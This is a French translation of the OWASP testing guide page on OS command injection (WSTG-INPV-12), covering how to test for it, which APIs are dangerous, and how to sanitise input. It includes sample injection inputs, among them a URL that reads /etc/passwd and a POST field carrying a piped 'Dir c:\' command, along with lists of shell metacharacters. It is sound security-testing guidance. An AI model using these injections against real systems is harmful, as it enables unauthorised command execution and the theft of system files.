# Test pour l'injection de commande

|ID          |
|------------|
|WSTG-INPV-12|

## Sommaire

Cet article explique comment tester une application pour l'injection de commandes de système d'exploitation. Le testeur essaiera d'injecter une commande du système d'exploitation via une requête HTTP à l'application.

L'injection de commandes OS est une technique utilisée via une interface web afin d'exécuter des commandes OS sur un serveur web. L'utilisateur fournit des commandes de système d'exploitation via une interface Web afin d'exécuter des commandes de système d'exploitation. Toute interface Web qui n'est pas correctement nettoyée est sujette à cet exploit. Avec la possibilité d'exécuter des commandes du système d'exploitation, l'utilisateur peut télécharger des programmes malveillants ou même obtenir des mots de passe. L'injection de commandes du système d'exploitation peut être évitée lorsque la sécurité est mise en avant lors de la conception et du développement d'applications.

## Objectifs des tests

- Identifier et évaluer les points d'injection de commandes.

## Comment tester

Lors de l'affichage d'un fichier dans une application Web, le nom du fichier est souvent affiché dans l'URL. Perl permet de diriger les données d'un processus vers une instruction ouverte. L'utilisateur peut simplement ajouter le symbole Pipe `|` à la fin du nom de fichier.

Exemple d'URL avant modification :

`http://sensitive/cgi-bin/userData.pl?doc=user1.txt`

Exemple d'URL modifiée :

`http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|`

Cela exécutera la commande `/bin/ls`.

L'ajout d'un point-virgule à la fin d'une URL pour une page .PHP suivi d'une commande du système d'exploitation exécutera la commande. `% 3B` est encodé en URL et décodé en point-virgule

exemple :

`http://sensitive/something.php?dir=%3Bcat%20/etc/passwd`

### exemple

Prenons le cas d'une application qui contient un ensemble de documents que vous pouvez parcourir à partir d'Internet. Si vous lancez un proxy personnel (tel que ZAP ou Burp Suite), vous pouvez obtenir un POST HTTP comme celui-ci (`http://www.exemple.com/public/doc`):

```txt
POST /public/doc HTTP/1.1
Host: www.exemple.com
[...]
Referer: http://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf
```

Dans cette requête de publication, nous remarquons comment l'application récupère la documentation publique. Nous pouvons maintenant tester s'il est possible d'ajouter une commande du système d'exploitation à injecter dans le POST HTTP. Essayez ce qui suit (`http://www.exemple.com/public/doc`):

```txt
POST /public/doc HTTP/1.1
Host: www.exemple.com
[...]
Referer: http://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf+|+Dir c:\
```

Si l'application ne valide pas la requête, nous pouvons obtenir le résultat suivant :

```txt
    Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
    Output...
    Il volume nell'unità C non ha etichetta.
    Numero di serie Del volume: 8E3F-4B61
    Directory of c:\
     18/10/2006 00:27 2,675 Dir_Prog.txt
     18/10/2006 00:28 3,887 Dir_ProgFile.txt
     16/11/2006 10:43
        Doc
        11/11/2006 17:25
           Documents and Settings
           25/10/2006 03:11
              I386
              14/11/2006 18:51
             h4ck3r
             30/09/2005 21:40 25,934
            OWASP1.JPG
            03/11/2006 18:29
                Prog
                18/11/2006 11:20
                    Program Files
                    16/11/2006 21:12
                        Software
                        24/10/2006 18:25
                            Setup
                            24/10/2006 23:37
                                Technologies
                                18/11/2006 11:14
                                3 File 32,496 byte
                                13 Directory 6,921,269,248 byte disponibili
                                Return code: 0
```

Dans ce cas, nous avons effectué avec succès une attaque par injection de système d'exploitation.

## Caractères spéciaux pour l'injection de commande

Le caractère spécial suivant peut être utilisé pour l'injection de commande tel que `|` `;` `&` `$` `>` `<` `'` `!`

- `cmd1|cmd2` : les utilisations de `|` feront que la commande 2 sera exécutée, que l'exécution de la commande 1 soit réussie ou non.
- `cmd1;cmd2` : L'utilisation de `;` fera en sorte que la commande 2 soit exécutée, que l'exécution de la commande 1 soit réussie ou non.
- `cmd1||cmd2` : La commande 2 ne sera exécutée que si l'exécution de la commande 1 échoue.
- `cmd1&&cmd2` : la commande 2 ne sera exécutée que si l'exécution de la commande 1 réussit.
- `$(cmd)` : Par exemple, `echo $(whoami)` ou `$(touch test.sh; echo 'ls' > test.sh)`
- `cmd` : Il est utilisé pour exécuter une commande spécifique. Par exemple, "whoami"
- `>(cmd)`: `>(ls)`
- `<(cmd)`: `<(ls)`

## Code Review API dangereuse

Soyez conscient des utilisations de l'API suivante car cela peut introduire des risques d'injection de commande.

### Java

- `Runtime.exec()`

### C/C++

- `system`
- `exec`
- `ShellExecute`

### Python

- `exec`
- `eval`
- `os.system`
- `os.popen`
- `subprocess.popen`
- `subprocess.call`

### PHP

- `system`
- `shell_exec`
- `exec`
- `proc_open`
- `eval`

## Correction

### Assainissement

L'URL et les données de formulaire doivent être filtrées pour les caractères non valides. Une liste de refus de caractères est une option, mais il peut être difficile de penser à tous les caractères à valider. Il se peut aussi que certains n'aient pas encore été découverts. Une liste d'autorisation contenant uniquement des caractères autorisés ou une liste de commandes doit être créée pour valider l'entrée de l'utilisateur. Les personnages qui ont été manqués, ainsi que les menaces non découvertes, doivent être éliminés de cette liste.

La liste de refus générale à inclure pour l'injection de commande peut être `|` `;` `&` `$` `>` `<` `'` `\` `!` `>>` `#`

Échappez ou filtrez les caractères spéciaux pour Windows,   `(` `)` `<` `>` `&` `*` `'` `|` `=` `?` `;` `[` `]` `^` `~` `!` `.` `"` `%` `@` `/` `\` `:` `+` `,` ``` ` ```
Échappez ou filtrez les caractères spéciaux pour Linux, `{` `}` `(` `)` `>` `<` `&` `*` `'` `|` `=` `?` `;` `[` `]` `$` `–` `#` `~` `!` `.` `"` `%`  `/` `\` `:` `+` `,` ``` ` ```

### Autorisations

L'application Web et ses composants doivent être exécutés avec des autorisations strictes qui n'autorisent pas l'exécution de commandes du système d'exploitation. Essayez de vérifier toutes ces informations pour tester d'un point de vue de test de boîte grise.

## Outils

- OWASP [WebGoat](https://owasp.org/www-project-webgoat/)
- [Commix](https://github.com/commixproject/commix)

## Références

- [Tests d'intrusion pour les applications Web (deuxième partie)](https://www.symantec.com/connect/articles/penetration-testing-web-applications-part-two)
- [Commande du système d'exploitation](http://projects.webappsec.org/w/page/13246950/OS%20Commanding)
- [CWE-78 : Neutralisation incorrecte d'éléments spéciaux utilisés dans une commande de système d'exploitation ("injection de commande de système d'exploitation")](https://cwe.mitre.org/data/definitions/78.html)
- [ENV33-C. Ne pas appeler system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177)
